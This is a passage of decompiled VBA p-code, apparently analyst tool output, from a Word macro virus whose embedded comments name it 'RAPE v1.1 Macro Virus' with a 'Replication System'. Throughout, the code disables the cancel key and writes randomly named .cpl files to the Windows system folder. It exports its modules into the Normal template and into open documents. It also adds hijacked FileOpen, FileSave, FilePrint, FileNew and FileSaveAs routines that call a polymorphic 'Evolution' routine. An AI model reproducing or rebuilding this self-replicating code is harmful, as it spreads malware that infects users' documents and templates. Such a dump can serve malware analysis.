' Line #118:
' 	QuoteRem 0x0001 0x0000 ""
' Line #119:
' 	OnError (Resume Next) 
' Line #120:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #121:
' 	LitStr 0x001C "C:\windows\system\export.sys"
' 	ArgsLd Dir 0x0001 
' 	St FExport 
' Line #122:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #123:
' 	Ld FExport 
' 	LitStr 0x000A "Export.sys"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Ex_Yes 
' 	EndIf 
' Line #124:
' 	Ld Ex_Yes 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Morph 
' 	Else 
' 	BoSImplicit 
' 	GoTo Recognize 
' 	EndIf 
' Line #125:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #126:
' 	Label Morph 
' Line #127:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #128:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #129:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #130:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St q 
' Line #131:
' 	QuoteRem 0x0001 0x0000 ""
' Line #132:
' 	StartForVariable 
' 	Ld vi 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld q 
' 	For 
' Line #133:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St x 
' Line #134:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #135:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St a$ 
' 	EndIf 
' Line #136:
' 	QuoteRem 0x0001 0x0000 ""
' Line #137:
' 	Ld x 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St a$ 
' 	EndIf 
' Line #138:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #139:
' 	Ld x 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St a$ 
' 	EndIf 
' Line #140:
' 	QuoteRem 0x0001 0x0000 ""
' Line #141:
' 	Ld x 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St a$ 
' 	EndIf 
' Line #142:
' 	Ld x 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St a$ 
' 	EndIf 
' Line #143:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St a$ 
' 	EndIf 
' Line #144:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #145:
' 	Ld x 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St a$ 
' 	EndIf 
' Line #146:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #147:
' 	Ld x 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St a$ 
' 	EndIf 
' Line #148:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #149:
' 	Ld x 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St a$ 
' 	EndIf 
' Line #150:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #151:
' 	Ld x 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St a$ 
' 	EndIf 
' Line #152:
' 	QuoteRem 0x0001 0x0000 ""
' Line #153:
' 	Ld x 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St a$ 
' 	EndIf 
' Line #154:
' 	Ld x 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St a$ 
' 	EndIf 
' Line #155:
' 	QuoteRem 0x0001 0x0000 ""
' Line #156:
' 	Ld x 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St a$ 
' 	EndIf 
' Line #157:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #158:
' 	Ld x 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St a$ 
' 	EndIf 
' Line #159:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #160:
' 	Ld x 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St a$ 
' 	EndIf 
' Line #161:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #162:
' 	Ld x 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St a$ 
' 	EndIf 
' Line #163:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #164:
' 	Ld x 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St a$ 
' 	EndIf 
' Line #165:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #166:
' 	Ld x 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St a$ 
' 	EndIf 
' Line #167:
' 	Ld x 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St a$ 
' 	EndIf 
' Line #168:
' 	Ld x 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St a$ 
' 	EndIf 
' Line #169:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #170:
' 	Ld x 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St a$ 
' 	EndIf 
' Line #171:
' 	Ld x 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St a$ 
' 	EndIf 
' Line #172:
' 	Ld x 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St a$ 
' 	EndIf 
' Line #173:
' 	Ld x 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St a$ 
' 	EndIf 
' Line #174:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #175:
' 	Ld x 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St a$ 
' 	EndIf 
' Line #176:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #177:
' 	Ld x 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St a$ 
' 	EndIf 
' Line #178:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #179:
' 	Ld Filename 
' 	Ld a$ 
' 	Add 
' 	St Filename 
' Line #180:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #181:
' 	StartForVariable 
' 	Ld vi 
' 	EndForVariable 
' 	NextVar 
' Line #182:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x03E7 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St x 
' Line #183:
' 	LitStr 0x0012 "C:\windows\system\"
' 	Ld Filename 
' 	Concat 
' 	Ld x 
' 	Concat 
' 	LitStr 0x0004 ".cpl"
' 	Concat 
' 	St FileID 
' Line #184:
' 	QuoteRem 0x0000 0x001F " RAPE v1.1 Export File ID Morph"
' Line #185:
' 	QuoteRem 0x0001 0x0000 ""
' Line #186:
' 	LitStr 0x001C "C:\windows\system\Export.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #187:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #188:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld FileID 
' 	PrintItemNL 
' Line #189:
' 	QuoteRem 0x0001 0x0000 ""
' Line #190:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #191:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #192:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #193:
' 	Ld x 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nex 
' 	EndIf 
' Line #194:
' 	QuoteRem 0x0001 0x0000 ""
' Line #195:
' 	Ld x 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo rite 
' 	EndIf 
' Line #196:
' 	Label rite 
' Line #197:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #198:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #199:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld x 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	PrintItemNL 
' Line #200:
' 	QuoteRem 0x0001 0x0000 ""
' Line #201:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #202:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #203:
' 	Label nex 
' Line #204:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #205:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #206:
' 	QuoteRem 0x0001 0x0000 ""
' Line #207:
' 	LitStr 0x001D "C:\windows\system\PMF1199.cpl"
' 	ArgsLd Dir 0x0001 
' 	St CheckMe 
' Line #208:
' 	Ld CheckMe 
' 	LitStr 0x000B "PMF1199.cpl"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nextt 
' 	EndIf 
' Line #209:
' 	Do 
' Line #210:
' 	QuoteRem 0x0001 0x0000 ""
' Line #211:
' 	OnError (Resume Next) 
' Line #212:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #213:
' 	QuoteRem 0x0001 0x0000 ""
' Line #214:
' 	LitDI2 0x0001 
' 	Ld Virname 
' 	LineInput 
' Line #215:
' 	Ld FileID 
' 	Ld Virname 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall export 0x0001 
' Line #216:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #217:
' 	Ld FileID 
' 	Ld Virname 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall export 0x0001 
' Line #218:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #219:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #220:
' 	Label nextt 
' Line #221:
' 	QuoteRem 0x0001 0x0000 ""
' Line #222:
' 	ExitFunc 
' Line #223:
' 	QuoteRem 0x0001 0x0000 ""
' Line #224:
' 	Label Recognize 
' Line #225:
' 	LitStr 0x001C "C:\windows\system\Export.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #226:
' 	QuoteRem 0x0001 0x0000 ""
' Line #227:
' 	LitDI2 0x0001 
' 	Ld FileID 
' 	LineInput 
' Line #228:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #229:
' 	QuoteRem 0x0001 0x0000 ""
' Line #230:
' 	LitStr 0x001D "C:\windows\system\PMF1199.cpl"
' 	ArgsLd Dir 0x0001 
' 	St CheckMe 
' Line #231:
' 	Ld CheckMe 
' 	LitStr 0x000B "PMF1199.cpl"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo tryharder 
' 	EndIf 
' Line #232:
' 	Do 
' Line #233:
' 	OnError (Resume Next) 
' Line #234:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #235:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #236:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #237:
' 	LitDI2 0x0001 
' 	Ld Virname 
' 	LineInput 
' Line #238:
' 	Ld FileID 
' 	Ld Virname 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall export 0x0001 
' Line #239:
' 	Ld FileID 
' 	Ld Virname 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall export 0x0001 
' Line #240:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #241:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #242:
' 	Label tryharder 
' Line #243:
' 	QuoteRem 0x0001 0x0000 ""
' Line #244:
' 	EndFunc 
' Line #245:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #246:
' 	FuncDefn (Function Polymorphic_Check())
' Line #247:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #248:
' 	OnError (Resume Next) 
' Line #249:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #250:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #251:
' 	Ld FileID2 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #252:
' 	Dim 
' 	VarDefn FC_Check
' Line #253:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #254:
' 	Do 
' Line #255:
' 	QuoteRem 0x0001 0x0000 ""
' Line #256:
' 	LitDI2 0x0001 
' 	Ld FC_Check 
' 	LineInput 
' Line #257:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #258:
' 	Ld FC_Check 
' 	LitStr 0x000F "Sub FileClose()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FC_There 
' 	BoS 0x0000 
' 	GoTo FO_Look 
' 	EndIf 
' Line #259:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #260:
' 	Label FO_Look 
' Line #261:
' 	Dim 
' 	VarDefn FO_Check
' Line #262:
' 	Do 
' Line #263:
' 	LitDI2 0x0001 
' 	Ld FO_Check 
' 	LineInput 
' Line #264:
' 	Ld FO_Check 
' 	LitStr 0x000E "Sub FileOpen()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FO_There 
' 	BoS 0x0000 
' 	GoTo FP_Look 
' 	EndIf 
' Line #265:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #266:
' 	Label FP_Look 
' Line #267:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #268:
' 	Dim 
' 	VarDefn FP_Check
' Line #269:
' 	Do 
' Line #270:
' 	LitDI2 0x0001 
' 	Ld FP_Check 
' 	LineInput 
' Line #271:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #272:
' 	Ld FP_Check 
' 	LitStr 0x000F "Sub FilePrint()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FP_There 
' 	BoS 0x0000 
' 	GoTo FN_Look 
' 	EndIf 
' Line #273:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #274:
' 	Label FN_Look 
' Line #275:
' 	Dim 
' 	VarDefn FN_Check
' Line #276:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #277:
' 	Do 
' Line #278:
' 	LitDI2 0x0001 
' 	Ld FN_Check 
' 	LineInput 
' Line #279:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #280:
' 	Ld FN_Check 
' 	LitStr 0x000D "Sub FileNew()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FN_There 
' 	BoS 0x0000 
' 	GoTo FS_Look 
' 	EndIf 
' Line #281:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #282:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #283:
' 	Label FS_Look 
' Line #284:
' 	Dim 
' 	VarDefn FS_Check
' Line #285:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #286:
' 	Do 
' Line #287:
' 	LitDI2 0x0001 
' 	Ld FS_Check 
' 	LineInput 
' Line #288:
' 	Ld FS_Check 
' 	LitStr 0x000E "Sub FileSave()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FS_There 
' 	BoS 0x0000 
' 	GoTo FSA_Look 
' 	EndIf 
' Line #289:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #290:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #291:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #292:
' 	Label FSA_Look 
' Line #293:
' 	Dim 
' 	VarDefn FSA_Check
' Line #294:
' 	Do 
' Line #295:
' 	LitDI2 0x0001 
' 	Ld FSA_Check 
' 	LineInput 
' Line #296:
' 	Ld FSA_Check 
' 	LitStr 0x0010 "Sub FileSaveAs()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FSA_There 
' 	BoS 0x0000 
' 	ExitFunc 
' 	EndIf 
' Line #297:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #298:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #299:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #300:
' 	EndFunc 
' Line #301:
' 	QuoteRem 0x0001 0x0000 ""
' Line #302:
' 	FuncDefn (Function Evolve())
' Line #303:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #304:
' 	OnError (Resume Next) 
' Line #305:
' 	QuoteRem 0x0001 0x0000 ""
' Line #306:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #307:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #308:
' 	QuoteRem 0x0000 0x0047 "RAPE v1.1 Macro Virus Command/Code Editor - adds 1 to 6 Commands (subs)"
' Line #309:
' 	LitStr 0x001C "C:\windows\system\Export.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #310:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #311:
' 	LitDI2 0x0001 
' 	Ld FileID2 
' 	LineInput 
' Line #312:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #313:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #314:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #315:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0096 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St PM 
' Line #316:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #317:
' 	Ld PM 
' 	LitDI2 0x0016 
' 	Eq 
' 	IfBlock 
' Line #318:
' 	Ld FC_There 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #319:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #320:
' 	Ld FileID2 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #321:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #322:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "Sub FileClose()"
' 	PrintItemNL 
' Line #323:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "On error resume next"
' 	PrintItemNL 
' Line #324:
' 	QuoteRem 0x0001 0x0000 ""
' Line #325:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Call Evolution"
' 	PrintItemNL 
' Line #326:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "Wordbasic.FileSave"
' 	PrintItemNL 
' Line #327:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #328:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #329:
' 	EndIfBlock 
' Line #330:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #331:
' 	Ld PM 
' 	LitDI2 0x0049 
' 	Eq 
' 	IfBlock 
' Line #332:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #333:
' 	Ld FO_There 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #334:
' 	Ld FileID2 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #335:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Sub FileOpen()"
' 	PrintItemNL 
' Line #336:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "on error resume next"
' 	PrintItemNL 
' Line #337:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #338:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "Dialogs(wdDialogFileOpen)"
' 	PrintItemNL 
' Line #339:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Call Evolution"
' 	PrintItemNL 
' Line #340:
' 	QuoteRem 0x0001 0x0000 ""
' Line #341:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "end sub"
' 	PrintItemNL 
' Line #342:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #343:
' 	QuoteRem 0x0001 0x0000 ""
' Line #344:
' 	EndIfBlock 
' Line #345:
' 	QuoteRem 0x0001 0x0000 ""
' Line #346:
' 	Ld PM 
' 	LitDI2 0x0045 
' 	Eq 
' 	IfBlock 
' Line #347:
' 	Ld FP_There 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #348:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #349:
' 	Ld FileID2 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #350:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "Sub FilePrint()"
' 	PrintItemNL 
' Line #351:
' 	QuoteRem 0x0001 0x0000 ""
' Line #352:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "on error resume next"
' 	PrintItemNL 
' Line #353:
' 	QuoteRem 0x0001 0x0000 ""
' Line #354:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "Dialogs(wdDialogFilePrint)"
' 	PrintItemNL 
' Line #355:
' 	QuoteRem 0x0001 0x0000 ""
' Line #356:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Call Evolution"
' 	PrintItemNL 
' Line #357:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #358:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End sub"
' 	PrintItemNL 
' Line #359:
' 	QuoteRem 0x0001 0x0000 ""
' Line #360:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #361:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #362:
' 	EndIfBlock 
' Line #363:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #364:
' 	Ld PM 
' 	LitDI2 0x007A 
' 	Eq 
' 	IfBlock 
' Line #365:
' 	QuoteRem 0x0001 0x0000 ""
' Line #366:
' 	Ld FN_There 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #367:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #368:
' 	Ld FileID2 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #369:
' 	QuoteRem 0x0001 0x0000 ""
' Line #370:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "Sub FileNew()"
' 	PrintItemNL 
' Line #371:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #372:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "on error resume next"
' 	PrintItemNL 
' Line #373:
' 	QuoteRem 0x0001 0x0000 ""
' Line #374:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "Dialogs(wdDialogFileNew)"
' 	PrintItemNL 
' Line #375:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Call Evolution"
' 	PrintItemNL 
' Line #376:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #377:
' 	QuoteRem 0x0001 0x0000 ""
' Line #378:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #379:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #380:
' 	EndIfBlock 
' Line #381:
' 	QuoteRem 0x0001 0x0000 ""
' Line #382:
' 	Ld PM 
' 	LitDI2 0x005A 
' 	Eq 
' 	IfBlock 
' Line #383:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #384:
' 	Ld FS_There 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #385:
' 	Ld FileID2 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #386:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Sub FileSave()"
' 	PrintItemNL 
' Line #387:
' 	QuoteRem 0x0001 0x0000 ""
' Line #388:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "on error resume next"
' 	PrintItemNL 
' Line #389:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "call Evolution"
' 	PrintItemNL 
' Line #390:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "wordbasic.filesave"
' 	PrintItemNL 
' Line #391:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "end sub"
' 	PrintItemNL 
' Line #392:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #393:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #394:
' 	EndIfBlock 
' Line #395:
' 	Ld PM 
' 	LitDI2 0x0008 
' 	Eq 
' 	IfBlock 
' Line #396:
' 	Ld FSA_There 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #397:
' 	QuoteRem 0x0001 0x0000 ""
' Line #398:
' 	Ld FileID2 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #399:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #400:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "Sub FileSaveAs()"
' 	PrintItemNL 
' Line #401:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "on error resume next"
' 	PrintItemNL 
' Line #402:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #403:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "Dialogs(wdDialogFileSaveAs)"
' 	PrintItemNL 
' Line #404:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
